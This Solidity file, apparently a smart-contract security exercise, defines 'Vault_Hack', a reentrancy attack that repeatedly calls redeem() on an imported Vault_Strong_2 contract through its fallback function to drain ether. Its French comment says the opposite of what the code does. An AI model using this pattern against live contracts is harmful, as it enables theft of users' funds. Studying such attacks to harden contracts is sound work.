// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.2;

import "./Vault_Strong_2.sol";
 
 /** @dev Ce contrat d'attaque a pour but d'empêcher de créer une boucle d'appel de la fonction redeem avant même que celle-ci ne mette à jour la balance de notre addresse
*/
contract Vault_Hack {
    Vault_Strong_2 contract_attacked;

    constructor(address _contractAttackedAddress) payable {
        contract_attacked = Vault_Strong_2(_contractAttackedAddress);
    }
 
    function attack() public payable {
        contract_attacked.store{value: msg.value}();
        contract_attacked.redeem();
    }
    
    fallback() external payable {
        if(address(contract_attacked).balance >= 1 ether) {
            contract_attacked.redeem();
        }
    }
}